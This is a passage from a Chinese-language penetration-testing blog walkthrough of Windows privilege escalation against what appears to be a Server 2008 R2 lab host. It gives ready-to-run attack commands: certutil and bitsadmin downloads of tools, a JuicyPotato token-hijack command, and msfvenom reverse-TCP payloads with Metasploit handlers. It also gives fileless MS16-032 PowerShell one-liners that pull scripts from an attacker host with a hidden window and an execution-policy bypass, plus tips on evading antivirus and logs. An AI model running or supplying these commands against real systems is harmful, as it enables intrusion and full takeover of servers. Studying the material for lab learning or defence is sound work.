+<p>优势：</p>
+<ul>
+<li>MSF自带功能，稳定；</li>
+<li>全程命令行操作，不用切换蚁剑软件；</li>
+<li>适合批量上传提权工具、反弹木马、漏洞利用程序，内网渗透最主流方式。</li>
+</ul>
+<ol start="2">
+<li><strong>蚁剑图形界面拖拽上传</strong></li>
+</ol>
+<ul>
+<li>条件：Webshell网站权限</li>
+<li>操作：本地文件直接拖进服务器目录文件夹</li>
+<li>优势：可视化；</li>
+<li>局限：大文件容易中断，大量渗透工具上传不如meterpreter便捷。</li>
+</ul>
+<ol start="3">
+<li><strong>蚁剑终端CMD命令上传</strong></li>
+</ol>
+<ul>
+<li>Kali 开简易网页服务，存放 exe 工具</li>
+<li>蚁剑 CMD 里用 certutil&#x2F;powershell 等命令，从 Kali 地址把文件下载到服务器 C:\Windows\Temp</li>
+</ul>
+<p><strong><u>PowerShell 下载方式</u></strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;远程文件下载地址&#x27;</span>,<span class="string">&#x27;Windows本地保存路径&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>适配范围<br>Windows Server2008R2、Win7 默认PS2.0 完美运行，渗透老服务器最稳妥。</li>
+<li>结构拆分</li>
+</ol>
+<ul>
+<li><code>.DownloadFile()</code>：固定下载方法  </li>
+<li><code>(New-Object System.Net.WebClient)</code>：固定开头，调用.NET 下载类</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> 远程文件地址 <span class="literal">-OutFile</span> 本地存储路径</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>适用条件<br>PowerShell 3.0及以上系统（Win10、Server2012及新版服务器）</li>
+<li>缺点<br>Win2008R2默认PS2.0，执行直接报错，不能用</li>
+<li>结构拆分</li>
+</ol>
+<ul>
+<li><code>Invoke-WebRequest</code>：固定请求命令</li>
+<li><code>-Uri</code>：标记远程网络资源地址</li>
+<li><code>-OutFile</code>：标记文件存放本地路径</li>
+</ul>
+<p><strong><u>CMD原生下载命令</u></strong></p>
+<ol>
+<li>certutil（兼容性天花板，2008R2必用）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f 远程下载链接 本地保存路径</span><br></pre></td></tr></table></figure>
+
+<p>参数：</p>
+<ul>
+<li><code>-urlcache</code>：调用缓存下载；</li>
+<li><code>-split -f</code>：强制写入磁盘文件</li>
+<li>优点：所有Windows系统自带，无版本限制，杀毒早期不易拦截</li>
+</ul>
+<ol start="2">
+<li>bitsadmin 后台静默下载</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer 自定义任务名 远程下载链接 本地保存路径</span><br></pre></td></tr></table></figure>
+
+<p>特点：后台悄悄下载，无窗口弹窗，适合隐蔽渗透</p>
+<p><strong>阶段 2：在目标服务器 CMD 终端执行完整提权命令</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> C:\Windows\Temp\p.exe &gt; C:\Windows\Temp\p.bat &amp;&amp; C:\Windows\Temp\jp.exe <span class="literal">-l</span> <span class="number">1337</span> <span class="literal">-p</span> C:\Windows\Temp\p.bat <span class="literal">-t</span> * <span class="literal">-c</span> &#123;<span class="number">9</span>B1F122C<span class="literal">-2982-4e91-AA8B-E071D54F2A4D</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602696871_ypnf86.webp" loading='lazy'></p>
+<p>命令拆分：</p>
+<ol>
+<li>生成批处理脚本 p.bat</li>
+</ol>
+<p><code>echo C:\Windows\Temp\p.exe &gt; C:\Windows\Temp\p.bat</code></p>
+<p>在磁盘新建脚本文件，内部内容只有一行：<code>C:\Windows\Temp\p.exe</code></p>
+<p>功能：被调用时自动运行反弹木马。</p>
+<ol start="2">
+<li>运行 JuicyPotato 提权程序</li>
+</ol>
+<p>参数详解：</p>
+<ul>
+<li><code>-l 1337</code>：开启 1337 端口创建命名管道（土豆工具本地端口），等待 SYSTEM 进程接入</li>
+<li><code>-p</code>：提权后要启动的程序（这里填我们刚写好的 bat 脚本）</li>
+<li><code>-t *</code>：自动选择令牌复制模式</li>
+<li><code>-c CLSID串</code>：指定 Win2008 成功率最高的 Windows Update COM 组件 ID，强制以 SYSTEM 权限拉起系统进程</li>
+</ul>
+<p><strong>内部提权流转</strong></p>
+<ol>
+<li>诱导 SYSTEM 权限进程连接管道 → 劫持 SYSTEM 身份令牌</li>
+<li>复制令牌为进程主令牌</li>
+<li>用 SYSTEM 权限启动 p.bat → 运行 p.exe 反弹木马</li>
+</ol>
+<p><strong>阶段 3：Kali 接收新的 SYSTEM 权限 Meterpreter 会话</strong></p>
+<p>p.exe 主动向外连接 Kali 5555 端口，msf 监听端口收到全新会话： 日志提示：<code>Meterpreter session 1 opened</code> 这个新会话，就是<strong>系统最高权限会话</strong>。</p>
+<p><strong>阶段 4：权限验证</strong></p>
+<p>在新弹出的 meterpreter 控制台输入命令核验权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line"><span class="comment"># 输出: NT AUTHORITY\SYSTEM（Windows 顶级系统权限）</span></span><br><span class="line">meterpreter &gt; getprivs</span><br><span class="line"><span class="comment"># 输出: 所有权限 Enabled 开启状态</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602698572_xnoxzm.webp" loading='lazy'></p>
+<blockquote>
+<p>优缺点总结：</p>
+<p>优点：</p>
+<ol>
+<li>兼容性稳定，Win2008 R2 靶机几乎必成；</li>
+<li>CLSID 手动指定，不用工具自动遍历耗时。</li>
+</ol>
+<p>缺点：</p>
+<ol>
+<li>硬盘遗留 3 个文件：jp.exe、p.exe、p.bat，文件落地极易被杀毒软件删除拦截；</li>
+<li>服务器会留下操作日志，容易被管理员溯源排查；</li>
+</ol>
+<p>因此仅作为备用兜底方案。</p>
+</blockquote>
+<h3 id="6-动静分析"><a href="#6-动静分析" class="headerlink" title="6. 动静分析"></a>6. 动静分析</h3><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>方案 A (MSF 反射 )</th>
+<th>方案 B (JuicyPotato)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>文件落地</td>
+<td>无 ✅</td>
+<td>JP.exe + BAT (~250KB) ❌</td>
+</tr>
+<tr>
+<td>进程创建</td>
+<td>创建新进程</td>
+<td>创建新进程</td>
+</tr>
+<tr>
+<td>网络连接</td>
+<td>反连 + COM 本地</td>
+<td>反连 + COM 本地</td>
+</tr>
+<tr>
+<td>杀软感知</td>
+<td>低 ( 无文件 )</td>
+<td>高 (JuicyPotato 被标记 )</td>
+</tr>
+<tr>
+<td>稳定性</td>
+<td>中 (CLSID 敏感 )</td>
+<td>高</td>
+</tr>
+</tbody></table>
+<h3 id="7-常见问题"><a href="#7-常见问题" class="headerlink" title="7. 常见问题"></a>7. 常见问题</h3><table>
+<thead>
+<tr>
+<th>问题</th>
+<th>原因</th>
+<th>解决</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>session ms16_075_reflection 无</td>
+<td>CLSID 不匹配或模块不稳定</td>
+<td>遍历 CLSID 重试，或换方案 B</td>
+</tr>
+<tr>
+<td>JuicyPotato 无反应</td>
+<td>CLSID 不匹配</td>
+<td>换 CLSID 重试</td>
+</tr>
+<tr>
+<td>COM failed</td>
+<td>CLSID 不匹配</td>
+<td>换 CLSID 重试</td>
+</tr>
+<tr>
+<td>CreateProcessWithToken 失败</td>
+<td>使用了不兼容的方式</td>
+<td>改用 -t u 或 -t c</td>
+</tr>
+</tbody></table>
+<h2 id="方法二：MS16-032-内核漏洞-无文件落地"><a href="#方法二：MS16-032-内核漏洞-无文件落地" class="headerlink" title="方法二：MS16-032 内核漏洞(无文件落地)"></a>方法二：MS16-032 内核漏洞(无文件落地)</h2><p>什么是条件竞争（Race Condition）？<br>核心：多个进程&#x2F;线程，争抢同一个共享资源，执行顺序不受系统固定管控，先后次序随机；攻击者利用这种时序不确定性，篡改文件、权限、内存数据，实现越权操作。</p>
+<h3 id="1-适用性验证"><a href="#1-适用性验证" class="headerlink" title="1. 适用性验证"></a>1. 适用性验证</h3><p>检测补丁：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 Meterpreter shell 中执行</span></span><br><span class="line">wmic qfe get hotfixid | findstr <span class="string">&quot;KB3139914&quot;</span></span><br><span class="line"><span class="comment"># 如果无输出 → 未打补丁，漏洞存在 ✓</span></span><br><span class="line"><span class="comment"># 如果有输出 → 已打补丁，漏洞不存在 ✗</span></span><br></pre></td></tr></table></figure>
+
+<p>转换编码格式：<code>chcp 65001</code></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602700658_uxuqkf.webp" loading='lazy'></p>
+<p>系统版本确认：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /i &quot;2008&quot;</span><br><span class="line"># 确认输出包含 &quot;Microsoft Windows Server 2008 R2&quot;</span><br></pre></td></tr></table></figure>
+
+<p>适用版本：<br>Windows 7 SP1 (x86&#x2F;x64)<br>Windows Server 2008 R2 SP1 (x64)<br>Windows 8.1 (x86&#x2F;x64)<br>Windows Server 2012 &#x2F; R2</p>
+<h3 id="2-原理"><a href="#2-原理" class="headerlink" title="2. 原理"></a>2. 原理</h3><p>MS16-032 (CVE-2016-0099) 是 Secondary Logon 服务 (seclogon) 的漏洞。该服务在处理线程句柄时存在竞争条件(Race Condition)：</p>
+<ol>
+<li>Secondary Logon 服务本身，是用 SYSTEM 最高权限 在后台运行的系统服务；</li>
+<li>服务内部会调用 NtImpersonateThread 这个系统 API，作用是：模拟客户端线程的身份，用来实现 “其他身份运行程序” 的系统功能；</li>
+<li>系统把「模拟身份」和「执行代码」拆成了两个先后动作，两个动作中间，留出了一段极短的空闲时间窗口；</li>
+<li>攻击者抓住这个时间缝隙，抢先修改线程上下文（线程的权限、身份环境）；</li>
+<li>服务继续执行后续代码时，会沿用被篡改后的线程配置，最终以 SYSTEM 权限运行攻击者自定义代码，实现权限提升。</li>
+</ol>
+<p>利用方式：PowerShell 漏洞脚本会不断循环、反复尝试抢占时序窗口（条件竞争成功率随机，需要多次重试），直到成功劫持权限，最终获取 SYSTEM 权限。</p>
+<h3 id="3-核心无文件原理"><a href="#3-核心无文件原理" class="headerlink" title="3. 核心无文件原理"></a>3. 核心无文件原理</h3><p><code>IEX(Invoke-Expression)</code> 是 PowerShell 内存执行命令：</p>
+<p>脚本文件托管在你的 Kali 攻击机 HTTP 服务上，目标机器只会把脚本下载进内存运行，不会保存到本地磁盘；</p>
+<p>Payload 载荷采用反射注入加载，同样只驻留内存，完美实现无文件落地。</p>
+<h3 id="4-操作步骤"><a href="#4-操作步骤" class="headerlink" title="4. 操作步骤"></a>4. 操作步骤</h3><p><strong><u>方法一：终端命令执行</u></strong></p>
+<h4 id="Step-1：蚁剑低权限会话迁移到MSF"><a href="#Step-1：蚁剑低权限会话迁移到MSF" class="headerlink" title="Step 1：蚁剑低权限会话迁移到MSF"></a>Step 1：蚁剑低权限会话迁移到MSF</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成 payload</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.23.131 LPORT=7777 -f exe &gt; payload.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.23.131</span><br><span class="line"><span class="built_in">set</span> LPORT 7777</span><br><span class="line">run </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602701940_d38wy4.webp" loading='lazy'></p>
+<h4 id="Step-2：Kali-攻击机前期准备"><a href="#Step-2：Kali-攻击机前期准备" class="headerlink" title="Step 2：Kali 攻击机前期准备"></a>Step 2：Kali 攻击机前期准备</h4><ol>
+<li>下载 MS16-032 漏洞利用 PowerShell 脚本</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载Invoke-MS16-032.ps1漏洞脚本（原Empire框架内置提权脚本）</span></span><br><span class="line">wget https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602704180_njdtth.webp" loading='lazy'></p>
+<ol start="2">
+<li>MSF 生成反弹 Meterpreter 载荷（后续提权成功后调用）</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.23.131 LPORT=7777 -f psh-reflection &gt; sys_ms16032.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602707137_m6uydy.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602709487_i7bdjg.webp" loading='lazy'></p>
+<ol start="3">
+<li>开启 Python 简易 HTTP 服务（端口 8080） 作用：让目标 Windows 可以远程访问下载上面两个 ps1 脚本</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602711094_37fjaf.webp" loading='lazy'></p>
+<blockquote>
+<p>访问 <code>http://kali 的 IP:8080/</code></p>
+<p>或者</p>
+<p>开启 Apache 网页服务</p>
+<ol>
+<li>把两个脚本放入 Apache 网站根目录</li>
+</ol>
+<p><code>mv Invoke-MS16-032.ps1 shell.ps1 /var/www/html/</code></p>
+<ol start="2">
+<li>启动 Apache 服务</li>
+</ol>
+<p><code>systemctl start apache2</code></p>
+<ol start="3">
+<li>验证：浏览器访问 <code>http://kali 的 IP/</code> 就能看到两个文件，目标机器 PowerShell 同样可以通过该地址远程下载脚本载入内存。</li>
+</ol>
+</blockquote>
+<h4 id="Step-3：在目标服务器执行命令"><a href="#Step-3：在目标服务器执行命令" class="headerlink" title="Step 3：在目标服务器执行命令"></a>Step 3：在目标服务器执行命令</h4><p>注：3 种方式，推荐批处理中转；如果不行，可以用 MSF 自带的模块</p>
+<p>前提：已经通过蚁剑拿到目标低权限 WebShell（IIS&#x2F;NETWORK SERVICE 权限），在终端执行命令</p>
+<p><strong>方式一：BAT 中转单次执行(推荐，100% 避开引号解析问题)</strong></p>
+<p>CMD 内执行整段命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> @<span class="built_in">echo</span> off &gt; C:\Windows\Temp\ms16.bat &amp;&amp; <span class="built_in">echo</span> powershell -nop -w hidden -<span class="built_in">exec</span> bypass -c <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.23.131:8080/Invoke-MS16-032.ps1&#x27;);Invoke-MS16-032 -Command &#x27;powershell -nop -w hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://192.168.23.131:8080/sys_ms16032.ps1&#x27;&#x27;)&#x27;&quot;</span> &gt;&gt; C:\Windows\Temp\ms16.bat &amp;&amp; C:\Windows\Temp\ms16.bat</span><br></pre></td></tr></table></figure>
+
+<p>命令拆解：</p>
+<ol>
+<li><code>echo @echo off &gt; C:\Windows\Temp\ms16.bat</code>创建空 bat 脚本，写入 <code>@echo off</code></li>
+<li>下载 MS16-032 漏洞脚本到内存并加载：<code>IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.23.131:8080/Invoke-MS16-032.ps1&#39;)</code></li>
+<li>调用提权函数，提权成功后执行 <code>-Command</code> 内部代码：以 SYSTEM 权限再次下载反弹 shell 脚本 <code>sys_ms16032.ps1</code> 内存运行，反弹会话回 Kali。</li>
+<li><code>C:\Windows\Temp\ms16.bat</code>运行刚刚生成的批处理脚本。</li>
+</ol>
+<p><strong>方式二：直接 PowerShell(如果批处理不行)</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -<span class="built_in">exec</span> bypass -c <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.23.131:8080/Invoke-MS16-032.ps1&#x27;);Invoke-MS16-032 -Command &#x27;powershell -nop -w hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://192.168.23.131:8080/sys_ms16032.ps1&#x27;&#x27;)&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>命令拆解：</p>
+<ol>
+<li>powershell 启动全局参数</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -exec bypass -c &quot;......&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>powershell</code>：调用系统PowerShell程序</li>
+<li><code>-nop</code><br>全称 <code>-NoProfile</code>，不加载用户预设配置文件，减少日志痕迹、启动更快</li>
+<li><code>-w hidden</code><br>全称 <code>-WindowStyle Hidden</code>，完全隐藏PowerShell弹窗，后台静默运行，不会弹出黑窗口被发现</li>
+<li><code>-exec bypass</code><br>绕过Windows默认PowerShell执行策略（系统默认禁止执行远程ps1脚本，这条参数必须加）</li>
+<li><code>-c &quot;内容&quot;</code><br>全称 <code>-Command</code>，双引号包裹内部所有代码，交给PowerShell解析执行</li>
+</ul>
+<ol start="2">
+<li>双引号内部内容</li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.23.131:8080/Invoke-MS16-032.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>New-Object Net.WebClient</code>：创建网络下载工具对象</li>
+<li><code>.DownloadString(网址)</code>：访问Kali的HTTP服务，把漏洞脚本以文本形式读取进内存</li>
+<li><code>IEX()</code>：内存执行命令，读取到的脚本字符串直接运行，<strong>不保存到磁盘</strong><br>✅ 效果：加载MS16-032漏洞利用脚本，注册提权函数 <code>Invoke-MS16-032</code></li>
+<li><code>;</code>：命令分隔符，执行完上段，再运行下段提权代码</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-MS16</span><span class="literal">-032</span> <span class="literal">-Command</span> <span class="string">&#x27;powershell -nop -w hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#x27;</span><span class="string">&#x27;http://192.168.23.131:8080/sys_ms16032.ps1&#x27;</span><span class="string">&#x27;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>Invoke-MS16-032</code>：调用MS16-032漏洞函数，触发seclogon服务条件竞争漏洞，提升权限至SYSTEM</li>
+<li><code>-Command &#39;xxx&#39;</code><br>含义：<strong>提权成功拿到SYSTEM权限之后，执行单引号内部的整套命令</strong><ul>
+<li>层级2包裹符：<strong>单引号 ‘ ‘</strong></li>
+</ul>
+</li>
+</ul>
+<ol start="3">
+<li>单引号内部内容：</li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-exec</span> bypass <span class="literal">-c</span> <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;&#x27;</span>http://<span class="number">192.168</span>.<span class="number">23.131</span>/sys_ms16032.ps1<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>作用：以SYSTEM最高权限，再次远程下载 <code>sys_ms16032.ps1</code>（反弹Meterpreter木马脚本），内存运行，主动回连Kali监听端口</p>
+<p>最内层网址：<code>&#39;&#39;</code> 两个连续单引号（转义关键）</p>
+<p>PowerShell语法规则：<br>单引号包裹的字符串里，想要书写1个字面单引号，必须写<strong>两个单引号</strong>做转义<br>解析完成后，会自动识别为：<br><code>&#39;http://192.168.23.131:8080/sys_ms16032.ps1&#39;</code><br>如果只写一个单引号，引号会提前闭合，整条命令直接报错中断。</p>
+<p><strong>完整执行时序</strong></p>
+<p>Kali 硬盘存放文件 → 目标每次按需内存拉取 → 循环触发条件竞争提权 → SYSTEM 权限内存运行反弹木马 → 拿到最高权限会话，全程无磁盘落地。</p>
+<p><strong>方式三：BAT 循环延时执行</strong></p>
+<p>如果第一次失败，循环尝试(竞争条件需要多次触发)：把原本单次执行的 MS16-032 提权代码，封装进<strong>for 循环</strong>，自动连续执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo @echo off &gt; C:\Windows\Temp\ms16_loop.bat &amp;&amp; echo for /L %%i in (1,1,5) do ( &gt;&gt; C:\Windows\Temp\ms16_loop.bat &amp;&amp; echo powershell -nop -w hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.23.131:8080/Invoke-MS16-032.ps1&#x27;);try &#123; Invoke-MS16-032 -Command &#x27;powershell -nop -w hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://192.168.23.131:8080/sys_ms16032.ps1&#x27;&#x27;)&#x27; &#125; catch &#123;&#125;&quot; &gt;&gt; C:\Windows\Temp\ms16_loop.bat &amp;&amp; echo timeout /t 2 /nobreak &gt;&gt; C:\Windows\Temp\ms16_loop.bat &amp;&amp; echo ) &gt;&gt; C:\Windows\Temp\ms16_loop.bat &amp;&amp; C:\Windows\Temp\ms16_loop.bat</span><br></pre></td></tr></table></figure>
+
+<p>命令拆解：</p>
+<ol>
+<li><code>echo @echo off &gt; C:\Windows\Temp\ms16_loop.bat</code>创建空循环批处理文件</li>
+</ol>
+<blockquote>
+<p><code>&gt; </code>覆盖写入，新建文件</p>
+<p>文件首行：<code>@echo off</code>关闭命令回显，静默运行不打印日志</p>
+</blockquote>
+<ol start="2">
+<li><code>echo for /L %%i in (1,1,5) do ( &gt;&gt; C:\Windows\Temp\ms16_loop.bat</code>写入 for 循环起始语句</li>
+</ol>
+<blockquote>
+<p><strong>for &#x2F;L 循环语法释义</strong></p>
+<p><code>for /L %%i in (起始值,步长,结束值)</code></p>
+<p>这里 <code>(1,1,5)</code>：</p>
+<p>循环变量 i 从 1 开始，每次 + 1，循环一共执行 5 次</p>
+<p>do ( 代表：大括号内部是每一轮要重复执行的代码</p>
+<p><code>&gt;&gt; </code>追加写入，不会清空前面内容</p>
+</blockquote>
+<ol start="3">
+<li>中间PowerShell整段代码写入</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo powershell -nop -w hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.23.131:8080/Invoke-MS16-032.ps1&#x27;);try &#123; Invoke-MS16-032 -Command &#x27;powershell -nop -w hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://192.168.23.131:8080/sys_ms16032.ps1&#x27;&#x27;)&#x27; &#125; catch &#123;&#125;&quot; &gt;&gt; C:\Windows\Temp\ms16_loop.bat</span><br></pre></td></tr></table></figure>
+
+<p>向bat循环体内写入核心提权指令</p>
+<ul>
+<li><code>-nop</code>：不加载用户PowerShell配置文件</li>
+<li><code>-w hidden</code>：隐藏PowerShell黑窗口</li>
+<li><code>-exec bypass</code>：绕过系统默认脚本执行限制</li>
+<li><code>IEX+DownloadString</code>：远程拉取脚本仅载入内存，无文件落地硬盘</li>
+<li><code>try{} catch{}</code>：异常捕获<br>单次条件竞争提权失败、网络报错全部被捕获，不会中断整体循环，直接进入下一轮重试</li>
+<li>内层<code>&#39;&#39;</code>：单引号转义语法，保证网址引号解析正常</li>
+</ul>
+<ol start="4">
+<li><code>echo timeout /t 2 /nobreak &gt;&gt; C:\Windows\Temp\ms16_loop.bat</code>写入延时等待指令</li>
+</ol>
+<ul>
+<li><code>timeout /t 2</code>：每轮提权结束后暂停2秒钟</li>
+<li><code>/nobreak</code>：键盘按键无法打断倒计时<br>作用：给系统线程调度留出间隙，提升条件竞争触发成功率，防止服务卡死</li>
+</ul>
+<ol start="5">
+<li><code>echo ) &gt;&gt; C:\Windows\Temp\ms16_loop.bat</code>写入循环闭合右括号，补齐for循环语法结尾，整套循环结构完整闭合</li>
+<li><code>&amp;&amp; C:\Windows\Temp\ms16_loop.bat</code>运行刚刚全部生成完毕的循环批处理脚本</li>
+<li><code>&amp;&amp;</code>规则：前面所有步骤无报错，才会执行运行脚本操作</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602713236_sheloq.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602715214_oewuc7.webp" loading='lazy'></p>
+<p>这个方法太吃运气了，竞争不了一点啊啊啊啊！！！</p>
+<p>换一个方法，注意不要退出刚刚那个会话，而是将会话放到后台运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bg</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602717923_uj5ta7.webp" loading='lazy'></p>
+<p><strong><u>方法二：MSF 模块直接利用</u></strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms16_032</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602719789_7rgk35.webp" loading='lazy'></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加载MS16-032专用本地提权模块</span></span><br><span class="line">use exploit/windows/local/ms16_032_secondary_logon_handle_privesc</span><br><span class="line"><span class="comment"># 指定需要提权的低权限meterpreter会话（蚁剑转入MSF的初始会话，根据实际情况）</span></span><br><span class="line"><span class="built_in">set</span> SESSION 1</span><br><span class="line"><span class="comment"># 设置反弹回连参数</span></span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.23.131</span><br><span class="line"><span class="comment"># 更换新端口</span></span><br><span class="line"><span class="built_in">set</span> LPORT 8888</span><br><span class="line"><span class="comment"># 自动运行模块，内部循环触发竞争条件提权</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602722969_fr4c5y.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602725242_d1b6tr.webp" loading='lazy'></p>
+<p>力竭了！！！</p>
